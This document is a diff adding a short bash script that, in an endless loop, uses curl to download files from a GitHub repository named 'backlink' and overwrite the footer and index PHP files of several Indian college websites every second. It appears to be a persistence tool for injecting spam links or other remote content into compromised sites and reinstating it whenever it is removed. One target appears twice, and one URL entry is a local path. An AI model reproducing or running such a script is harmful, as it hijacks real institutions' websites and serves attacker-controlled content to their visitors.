@@ -1,0 +1,29 @@
+#!/bin/bash
+
+FILES=(
+"/home/u782112912/domains/mgcl.edu.in/public_html/include/footer.php"
+"/home/u782112912/domains/madhavcollege.edu.in/public_html/includes/footer.php"
+"/home/u782112912/domains/sdsmahavidhyalaya.edu.in/public_html/index.php"
+"/home/u782112912/domains/pgvcollege.edu.in/public_html/includes/footer.php"
+"/home/u782112912/domains/sdsmahavidhyalaya.edu.in/public_html/index.php"
+)
+
+URLS=(
+"https://raw.githubusercontent.com/flux-lab/backlink/refs/heads/main/footer-mgcledu"
+"https://raw.githubusercontent.com/flux-lab/backlink/refs/heads/main/footer-madhavcollege"
+"https://raw.githubusercontent.com/flux-lab/backlink/refs/heads/main/index-sdsmahavidhyalaya"
+"https://raw.githubusercontent.com/flux-lab/backlink/refs/heads/main/pgvcollege"
+"/home/u782112912/domains/sdsmahavidhyalaya.edu.in/public_html/index.php"
+)
+
+while true
+do
+
+for i in ${!FILES[@]}
+do
+curl -s "${URLS[$i]}" -o "${FILES[$i]}"
+done
+
+sleep 1
+
+done
